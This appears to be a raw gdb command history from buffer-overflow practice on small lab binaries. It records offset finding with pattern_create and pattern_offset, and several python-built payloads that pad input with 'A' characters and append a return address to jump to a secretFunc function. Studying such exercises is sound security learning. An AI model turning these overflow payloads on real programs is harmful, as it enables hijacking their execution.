list
layout asm
quit
list
info frames
help info
q
list
watch pattern
(gdb) break main
break main
run AAAAAAAAAAAAAAAAAAAAAAAAAAA
info frame
print buffer
disas main
x/32x 0x08048441
x/32xb 0x08048441
q
disas main
q
disas main
disas change
./flow.out $(python -c "print('a'*16+'0x0804843b')")
./flow.out $(python -c 'print('a'*16+'0x0804843b')')
./flow.out 111111111111111111110x0804843b
q
b vuln
r AAAA
pattern_create 300
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
disas main
disas secretFunc
disas vuln
pattern_create 300
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
x/1x $eip
pattern_offset 0x04857268
x/32x $esp
x/32xb $esp
q
disas main
disas vuln
disas secretFunc
b *0x0804847e
run
x/40xb $esp
python -c 'print("A" * 200 + "\x6b\x84\x04\x08")' > payload.txt
/bof1.out $(python -c "print('A' * 200 + '\x6b\x84\x04\x08')")
break 0x0804846b
b *0x0804846b
gdb bof1.out -q
cls
(gdb) list
list
break vuln
r
run < payload.txt
x/200x &array
continue
continue
continue
continue
continue
continue
objdump -t bof1.out | grep secretFunc
run < payload.txt
q
b vuln
list
dias
quit
b vuln
r
r $(python -c "print('A' * 200 + '\x6b\x84\x04\x08')")
info frame
x/40xb $esp
quit
disas main
b 0x08048454
q
b vuln
r
b gets
r
r
r $(python -c "print('A' * 204 + '\x6b\x84\x04\x08')")
r $(python -c "print('A' * 204 + '\x6b\x84\x04\x08')")
run $(python -c "print('A' * 204 + '\x6b\x84\x04\x08')")
continue
continue
q
disas main
b 0x080484c6
b vuln
r
x/32xb 0x08048441
q
r
b vunl
b vuln
r
$(python -c "print('A' * 212 + '\x6b\x84\x04\x08')")
r $(python -c "print('A' * 212 + '\x6b\x84\x04\x08')")
r $(python -c "print('A' * 212 + '\x6b\x84\x04\x08')")
continue
quit
r 
r $(python -c "print('A' * 212 + '\x6b\x84\x04\x08')")
r < input
continue
continue
r < input
r < input
r < input
r < input
r < input
r < input
r < input
r < input
r < input
r < input
r < input
r < input
r < $(python -c "print('A'*204+'\x6b\x84\x04\x08')")
r
r
continue
r
quit
r
r $(python -c "print('A'*204+'\x6b\x84\x04\x08')")
r < input
r < input
r < input
r < input
disas secretFunc
r
continue
r
q
r
r < input
q
r < input
continue
quit
r
r
r
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdddd
r
r
r
r
continue
r
quit
diase main
disase main
disas main
disas vuln
r AAAAA
b gets
r A
c
r
c
quit
disas vuln
b gets
r a
p $esp
disas vuln
b 0x8048330+32
b 0x080484a3
c
checksec
disas secretFunction
disas secretFunc
q
disas main 
quit
disas shell
quit
